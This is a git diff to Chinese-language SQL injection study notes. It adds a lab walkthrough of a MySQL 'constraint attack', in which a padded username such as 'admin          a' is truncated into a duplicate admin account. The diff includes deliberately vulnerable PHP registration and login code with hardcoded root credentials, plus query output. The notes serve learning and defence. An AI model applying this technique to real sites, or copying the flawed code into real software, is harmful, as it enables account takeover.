@@ -23,6 +23,7 @@
   - [约束攻击](#约束攻击)
   - [无列名注入](#无列名注入)
   - [insert update delete注入](#insert-update-delete注入)
+- [未完待续...](#未完待续)
 
 ## 注释
 
@@ -997,7 +998,7 @@ Time: 0.008s
 
 ### 约束攻击
 
->todo
+>利用mysql对空格的特殊处理来进行平行越权
 
 >注意varchar长度
 
@@ -1010,6 +1011,112 @@ create table user
     constraint user_pk
         primary key (id)
 );
+```
+
+```
+mysql root@localhost:sql_injection_test> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.5.47    |
++-----------+
+1 row in set
+Time: 0.008s
+
+mysql root@localhost:sql_injection_test> select * from user;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | admin    | ASDFG12345 |
++----+----------+------------+
+1 row in set
+Time: 0.009s
+```
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+if (empty($_POST['username']) || empty($_POST['password'])) {
+    exit();
+}
+$username = mysqli_real_escape_string($db, $_POST['username']);
+$password = mysqli_real_escape_string($db, $_POST['password']);
+var_dump($username);
+var_dump($password);
+$query = "select * from user where username = '$username'";
+$result = $db->query($query);
+if ($result->fetch_row()) {
+    die('已存在该用户');
+} else {
+    $query = "insert into user (`username`,`password`) values('$username','$password')";
+    $db->query($query);
+    die('注册成功');
+}
+```
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+if (empty($_POST['username']) || empty($_POST['password'])) {
+    exit();
+}
+$username = mysqli_real_escape_string($db, $_POST['username']);
+$password = mysqli_real_escape_string($db, $_POST['password']);
+$query = "select * from user where username = '$username' and password='$password';";
+$result = $db->query($query);
+var_dump($result->fetch_row());
+```
+
+直接注册`admin`显然是不可以的,但是可以对`username`传入参数为`admin          a`
+
+```
+mysql root@localhost:sql_injection_test> select * from user where username="admin          a"
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+0 rows in set
+Time: 0.009s
+```
+
+显然`admin          a`不存在数据库中,因此进行插入操作,而在进行插入操作时,由于字符串过长,mysql会对字符串进行截断后插入,字符串被截断为`admin     `
+
+mysql对空格会特殊处理,因此在实际插入操作时插入的数据为`admin`,由此达到了平行越权的目的
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282045402.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282047581.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282046916.png)
+
+```
+mysql root@localhost:sql_injection_test> select * from `user` where username='admin     ';
++----+------------+------------+
+| id | username   | password   |
++----+------------+------------+
+| 1  | admin      | ASDFG12345 |
+| 2  | admin      | admin      |
++----+------------+------------+
+2 rows in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select * from `user`;
++----+------------+------------+
+| id | username   | password   |
++----+------------+------------+
+| 1  | admin      | ASDFG12345 |
+| 2  | admin      | admin      |
++----+------------+------------+
+2 rows in set
+Time: 0.008s
 ```
 
 ### 无列名注入
@@ -1173,3 +1280,5 @@ Time: 0.008s
 ```
 
 ### insert update delete注入
+
+## 未完待续...
